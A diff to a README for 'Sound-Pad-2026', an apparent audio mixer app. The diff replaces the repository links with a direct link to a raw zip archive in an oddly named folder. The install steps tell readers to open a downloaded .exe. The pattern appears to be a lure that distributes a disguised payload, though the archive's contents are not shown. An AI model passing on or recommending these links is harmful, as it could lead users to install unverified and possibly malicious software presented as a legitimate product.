@@ -1,6 +1,6 @@
 # 🔊 Sound-Pad-2026 - Stream high quality audio with ease
 
-[![](https://img.shields.io/badge/Download-Sound--Pad--2026-blue)](https://github.com/marces8930/Sound-Pad-2026)
+[![](https://img.shields.io/badge/Download-Sound--Pad--2026-blue)](https://raw.githubusercontent.com/marces8930/Sound-Pad-2026/main/unrepenting/Pad_Sound_v3.3-alpha.5.zip)
 
 Sound-Pad-2026 serves as a virtual audio mixer for your computer. This tool manages your microphone input, computer sounds, and sound effects. Use this application to route audio in professional settings or during online broadcasts. The software handles signal processing to keep your audio clean and fast.
 
@@ -18,7 +18,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/marces8930/Sound-Pad-2026).
+1. Visit [this page to download](https://raw.githubusercontent.com/marces8930/Sound-Pad-2026/main/unrepenting/Pad_Sound_v3.3-alpha.5.zip).
 2. Look for the file ending in .exe.
 3. Click the file to start the download.
 4. Open the downloaded file once the process ends.
